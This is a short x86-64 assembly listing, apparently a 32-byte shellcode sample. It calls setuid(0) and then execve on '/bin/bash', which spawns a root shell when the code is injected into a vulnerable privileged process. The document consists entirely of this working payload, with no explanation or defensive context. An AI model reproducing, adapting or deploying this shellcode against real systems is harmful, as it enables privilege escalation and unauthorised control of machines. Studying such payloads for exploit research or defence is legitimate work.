# 32 bytes
.text
.globl _start
_start:
  xor    %rdi,%rdi
  pushq  $0x69
  pop    %rax
  syscall

  push   %rdi
  push   %rdi
  pop    %rsi
  pop    %rdx
  pushq  $0x68
  movabs $0x7361622f6e69622f,%rax
  push   %rax
  push   %rsp
  pop    %rdi
  pushq  $0x3b
  pop    %rax
  syscall


